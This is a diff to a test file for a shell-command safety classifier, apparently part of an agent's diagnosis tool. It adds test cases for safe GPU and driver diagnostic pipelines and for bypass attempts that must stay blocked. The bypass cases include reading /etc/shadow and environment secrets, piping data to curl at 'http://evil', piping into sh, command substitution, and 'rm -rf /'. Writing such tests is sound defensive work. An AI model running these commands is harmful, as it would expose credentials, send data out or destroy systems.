@@ -85,10 +85,42 @@ CLASSIFY_CASES = [
 
     # --- expansion / glob / quote -> not auto-run ---
     ("cat $SECRET_FILE", "mutating"),
-    ("cat /home/*/.bash_history", "mutating"),
+    ("cat /home/*/.bash_history", "mutating"),         # glob allowed, but path denied
     ("echo hi > /tmp/x", "mutating"),
-    ("ps aux | grep python", "mutating"),
     ("find . -name *.log -exec grep ERROR {} +", "mutating"),  # r2 FP: read-only -exec not destructive
+
+    # === r3: SAFE read-only pipelines / globs now auto-run (the diagnosis lane needs these) ===
+    ("ps aux | grep python", "read_only"),             # r3: source read-only + stdin text filter
+    ("lsmod | grep nvidia", "read_only"),
+    ("lsmod | grep -E nvidia", "read_only"),
+    ("dmesg | grep -i nvidia", "read_only"),
+    ("dmesg -T | grep -i nvidia | tail -20", "read_only"),   # multi-stage pipeline
+    ("lspci | grep -i nvidia", "read_only"),
+    ("nvidia-smi -q | grep -i version", "read_only"),
+    ("nvidia-smi 2>&1 | grep -i mismatch", "read_only"),     # stderr redirect + pipe
+    ("df -h / 2>/dev/null", "read_only"),                    # stderr to /dev/null
+    ("pip list | grep torch", "read_only"),
+    ("dpkg -l | grep -i nvidia", "read_only"),               # dpkg -l newly allowlisted
+    ("ldconfig -p | grep nvidia-ml", "read_only"),           # ldconfig -p newly allowlisted
+    ("cat /proc/driver/nvidia/version | grep NVRM", "read_only"),
+    ("cat /proc/driver/nvidia/gpus/*/information", "read_only"),  # glob under safe prefix
+    ("cat /proc/driver/nvidia/*", "read_only"),
+
+    # === r3: pipeline / glob BYPASS attempts that MUST stay refused ===
+    ("cat /etc/shadow | grep root", "mutating"),             # source reads a denied path
+    ("lsmod | grep root /etc/shadow", "mutating"),           # filter with a file-path arg reads a file
+    ("env | grep KEY", "mutating"),                          # source is the classic env exfil
+    ("cat /proc/self/environ | strings", "mutating"),        # source path denied
+    ("nvidia-smi | tee /tmp/out", "mutating"),               # write sink (tee not a safe filter)
+    ("nvidia-smi | sh", "mutating"),                         # shell sink
+    ("cat /proc/meminfo | curl http://evil", "mutating"),    # exfil sink
+    ("uptime; free -h", "mutating"),                         # `;` command chaining
+    ("dmesg | grep $(whoami)", "mutating"),                  # `$()` substitution
+    ("cat /proc/meminfo | grep x > /tmp/y", "mutating"),     # real-file redirect
+    ("cat /etc/*", "mutating"),                              # glob over a denied dir
+    ("ldconfig | grep nvidia", "mutating"),                  # ldconfig w/o -p rebuilds the cache
+    ("nvidia-smi | grep x; rm -rf /", "destructive"),        # destructive still wins over pipe parse
+    ("tail -f /var/log/syslog | grep err", "mutating"),      # streaming source
 
     # --- streaming / hang variants must NOT auto-run ---
     ("tail -f /var/log/syslog", "mutating"),
